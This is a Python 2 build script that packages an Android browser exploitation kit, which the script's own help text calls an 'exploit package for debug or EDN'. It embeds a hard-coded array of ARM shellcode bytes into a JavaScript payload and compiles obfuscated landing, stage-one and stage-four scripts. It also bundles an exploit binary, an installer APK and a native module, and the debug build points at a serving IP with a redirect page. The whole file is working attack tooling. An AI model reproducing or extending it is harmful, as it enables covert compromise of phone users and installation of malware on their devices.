#!/usr/bin/env python

import sys
import os
import stat
import shutil
import string
import argparse
import tempfile

from os.path import join as pjoin

def readfile(name):
    with open(name, "rb") as fp:
        content = fp.read()

    return content

def build_callstub(builddir, debug=False):
    print "Building callstub"
    return

    os.system("cd src/callstub; make")

def build_module(builddir, debug=False):
    print "Building module"
    return

    if debug is True:
        os.system("cd src/module; ndk-build DEBUG=1")
    else:
        os.system("cd src/module; ndk-build")

    shutil.copy(
        "src/module/libs/armeabi/libmodule.so",
        pjoin(builddir, "module.so")
    )

def build_landing(builddir, debug=False):
    print "Building landing page"
    tpl = string.Template(readfile("src/go.html"))

    if debug is False:
        cmd = ""
        cmd += "java -jar cc/compiler.jar"
        cmd += " --compilation_level ADVANCED_OPTIMIZATIONS"
        cmd += " --language_in ECMASCRIPT5"
        cmd += " --externs cc/xsltprocessor.js"
        cmd += " --js src/go.js"
        cmd += " --define='ENABLE_DEBUG=false'"
        cmd += " -W DEFAULT"
        cmd += " --js_output_file " + pjoin(builddir, "go.js.tmp")
        ret = os.system(cmd)

        if ret != 0:
            raise Exception(
                "Cannot compile script.js! CC returned {} (cmd: {})".format(
                    ret, cmd
                )
            )

        script = readfile(pjoin(builddir, "go.js.tmp"))
        os.remove(pjoin(builddir, "go.js.tmp"))
    else:
        script = readfile("src/go.js")

    content = tpl.safe_substitute({"C_LANDING_SCRIPT": script})
    with open(pjoin(builddir, "go.html"), "w+") as fp:
        fp.write(content)

def build_scripts(builddir, debug=False):
    print "Building script.js"
    #callstub = readfile("src/callstub/callstub.raw")
    #callstub = callstub[:callstub.index("\x0f\xde\xda\xba")] # 0xbadade0f

    #callstub_js  = "["
    #callstub_js += ", ".join(["0x{:02x}".format(ord(x)) for x in callstub])
    #callstub_js += "]"

    callstub_js = '[0xff, 0x40, 0x2d, 0xe9, 0x46, 0x4f, 0x8f, 0xe2, 0x00, 0x40, 0x94, 0xe5, 0x00, 0x50, 0x94, 0xe5, 0x00, 0x00, 0x55, 0xe3, 0x11, 0x00, 0x00, 0x0a, 0x04, 0x70, 0x94, 0xe5, 0x00, 0x00, 0x57, 0xe3, 0x04, 0x00, 0x00, 0x0a, 0x02, 0x70, 0xa0, 0xe3, 0x00, 0x00, 0x00, 0xef, 0x1c, 0x00, 0x84, 0xe5, 0x00, 0x00, 0x50, 0xe3, 0x34, 0x00, 0x00, 0x1a, 0x08, 0x00, 0x94, 0xe5, 0x0c, 0x10, 0x94, 0xe5, 0x10, 0x20, 0x94, 0xe5, 0x14, 0x30, 0x94, 0xe5, 0x18, 0x40, 0x94, 0xe5, 0x35, 0xff, 0x2f, 0xe1, 0xcc, 0x40, 0x8f, 0xe2, 0x00, 0x40, 0x94, 0xe5, 0x1c, 0x00, 0x84, 0xe5, 0x2a, 0x00, 0x00, 0xea, 0xc4, 0x50, 0x8f, 0xe2, 0x00, 0x50, 0x95, 0xe5, 0x00, 0x50, 0x84, 0xe5, 0x9c, 0x00, 0x8f, 0xe2, 0x00, 0x00, 0x90, 0xe5, 0x98, 0x40, 0x8f, 0xe2, 0x00, 0x40, 0x94, 0xe5, 0x94, 0x50, 0x8f, 0xe2, 0x00, 0x50, 0x95, 0xe5, 0x00, 0xd0, 0x90, 0xe5, 0x04, 0xd0, 0x4d, 0xe2, 0x00, 0x00, 0x9d, 0xe5, 0x04, 0x00, 0x50, 0xe1, 0xfb, 0xff, 0xff, 0x3a, 0x05, 0x00, 0x50, 0xe1, 0xf9, 0xff, 0xff, 0x2a, 0x20, 0xd0, 0x8d, 0xe2, 0x70, 0x40, 0x8f, 0xe2, 0x00, 0x40, 0x94, 0xe5, 0x6c, 0x50, 0x8f, 0xe2, 0x00, 0x50, 0x95, 0xe5, 0x08, 0x00, 0x9d, 0xe5, 0x04, 0x00, 0x50, 0xe1, 0x0b, 0x00, 0x00, 0x3a, 0x05, 0x00, 0x50, 0xe1, 0x09, 0x00, 0x00, 0x2a, 0x58, 0x00, 0x8f, 0xe2, 0x00, 0x00, 0x90, 0xe5, 0x01, 0x00, 0x50, 0xe3, 0x00, 0x00, 0x00, 0x0a, 0x30, 0x80, 0xbd, 0xe8, 0x40, 0xb0, 0x8f, 0xe2, 0x00, 0xb0, 0x9b, 0xe5, 0x30, 0x00, 0xbd, 0xe8, 0x74, 0x6a, 0x94, 0xe5, 0x04, 0xf0, 0x9d, 0xe4, 0x0c, 0x00, 0x9d, 0xe5, 0x04, 0x00, 0x50, 0xe1, 0x02, 0x00, 0x00, 0x3a, 0x05, 0x00, 0x50, 0xe1, 0x00, 0x00, 0x00, 0x2a, 0x70, 0x80, 0xbd, 0xe8, 0xf0, 0x80, 0xbd, 0xe8, 0xff, 0x80, 0xbd, 0xe8, 0x00, 0xdd, 0xda, 0xba, 0x01, 0xdd, 0xda, 0xba, 0x02, 0xdd, 0xda, 0xba, 0x03, 0xdd, 0xda, 0xba, 0x04, 0xdd, 0xda, 0xba, 0x05, 0xdd, 0xda, 0xba, 0x06, 0xdd, 0xda, 0xba, 0x07, 0xdd, 0xda, 0xba]'

    tpl = string.Template(readfile("src/script.js"))

    content = tpl.safe_substitute({"C_CALLSTUB": callstub_js})
    
    fd, temppath = tempfile.mkstemp()
    
    fp = os.fdopen(fd, "w")
    fp.write(content)
    fp.close()

    scriptpath = pjoin(builddir, "script.js")

    if debug is True:
        shutil.copy(temppath, scriptpath)
    else:
        print "Compiling script.js ..."
        cmd = ""
        cmd += "java -jar cc/compiler.jar"
        cmd += " --compilation_level ADVANCED_OPTIMIZATIONS"
        cmd += " --language_in ECMASCRIPT5"
        cmd += " --externs cc/xsltprocessor.js"
        cmd += " --js " + temppath
        cmd += " --define='ENABLE_DEBUG=false'"
        cmd += " -W DEFAULT"
        cmd += " --js_output_file " + scriptpath
        
        ret = os.system(cmd)

        if ret != 0:
            raise Exception(
                "Cannot compile script.js! CC returned {} (cmd: {})".format(
                    ret, cmd
                )
            )

    os.remove(temppath)

    print "Building redir.js"
    shutil.copy("src/redir.js", pjoin(builddir, "redir.js"))

def build_stage1(builddir, debug=False):
    print "Building stage1_xml.py"
    shutil.copy("src/stage1_xml.py", pjoin(builddir, "stage1_xml.py"))
    shutil.copy("src/stylesheet.xsl", pjoin(builddir, "stylesheet.xsl"))    
    
def build_stage4(builddir, debug=False):
    print "Building stage 4"
    
    if debug is True:
        shutil.copy("src/stage4.js", pjoin(builddir, "stage4.js"))
    else:
        print "Compiling stage4.js..."
        cmd = ""
        cmd += "java -jar cc/compiler.jar"
        cmd += " --compilation_level SIMPLE_OPTIMIZATIONS"
        cmd += " --language_in ECMASCRIPT5"
        cmd += " --externs cc/xsltprocessor.js"
        cmd += " --js src/stage4.js"
        cmd += " --define='ENABLE_DEBUG=false'"
        cmd += " -W DEFAULT"
        cmd += " --js_output_file " + pjoin(builddir, "stage4.js")
        
        ret = os.system(cmd)

        if ret != 0:
            raise Exception(
                "Cannot compile script.js! CC returned {} (cmd: {})".format(
                    ret, cmd
                )
            )
      
    shutil.copy("src/stage4_js.py", pjoin(builddir, "stage4_js.py"))

def build_debugserver(builddir, debug=True):
    print "Building debug server"
    shutil.copy("src/debugserver.py", pjoin(builddir, "debugserver.py"))
    shutil.copy("src/debug-tornado.py", pjoin(builddir, "debug-tornado.py"))

def build_ednscript(builddir):
    print "Building EDN script"
    path = pjoin(builddir, "build")
    shutil.copy("src/edn_build.py", path)

    # Set +x permission
    st = os.stat(path)
    mode = st.st_mode
    mode = mode | stat.S_IXGRP | stat.S_IXOTH | stat.S_IXUSR
    mode = mode | stat.S_IRGRP | stat.S_IROTH | stat.S_IRUSR
    os.chmod(path, mode)

def copy_external(builddir):
    print "Copying external dependencies ..."
    shutil.copy("ext/slowaes.py", pjoin(builddir, "slowaes.py"))

def build_release(custom_apk=None, custom_exploit=None):
    builddir = "build/release"

    try:
        os.makedirs(builddir)
    except OSError:
        pass

    print "Starting release build"
    build_callstub(builddir)
    build_module(builddir)
    build_landing(builddir)
    build_scripts(builddir)
    build_stage1(builddir)
    build_stage4(builddir)
    copy_external(builddir)

    copy_exploit(builddir, custom_exploit)

    build_ednscript(builddir)


def build_debug(custom_apk=None, custom_exploit=None):
    builddir = "build/debug"

    try:
        os.makedirs(builddir)
    except OSError:
        pass

    print "Starting debug build"
    build_callstub(builddir, debug=True)
    build_module(builddir, debug=True)
    build_landing(builddir, debug=True)
    build_scripts(builddir, debug=True)
    build_stage1(builddir, debug=True)
    build_stage4(builddir, debug=True)
    copy_external(builddir)

    build_debugserver(builddir, debug=True)
    
    copy_exploit(builddir, custom_exploit)
    copy_installer(builddir, custom_apk)

    build_ednscript(builddir)

    print "Performing debug build"

    import imp
    edn_build = imp.load_source("edn_build", pjoin(builddir, "build"))
    os.chdir(builddir)
    
    edn_build.edn_build(
        "androidhosted", "hack", "192.168.3.110", "", "https://www.baidu.com",
        "installer.apk", None, port=8080, landing="go.html", script_name="script",
        stage4_name="stage4.js", exploit_name="exploit",
        apk_name="installer.apk", module_name="module.so", debug_mode=True)

def copy_exploit(builddir, exploit):
    print "Copying exploit"

    if exploit is None:
        exploit = "installer/exploit"

    shutil.copy(exploit, pjoin(builddir, "exploit"))

def copy_installer(builddir, apk):
    print "Copying installer"
    if apk is None:
        apk = "installer/installer.apk"

    shutil.copy(apk, pjoin(builddir, "installer.apk"))

def main():
    parser = argparse.ArgumentParser(
        description="Build the exploit package for debug or EDN"
    )
    parser.add_argument("mode", help="The build configuration mode",
                        type=str,
                        choices=("debug", "release"))

    parser.add_argument("-a", "--apk",
                       help="Custom APK file",
                       type=argparse.FileType("rb"))

    parser.add_argument("-x", "--exploit",
                       help="Custom exploit file",
                       type=argparse.FileType("rb"))

    args = parser.parse_args()

    if args.mode == "debug":
        build_debug(args.apk, args.exploit)
    elif args.mode == "release":
        build_release(args.apk, args.exploit)
    

if __name__ == "__main__":
    main()
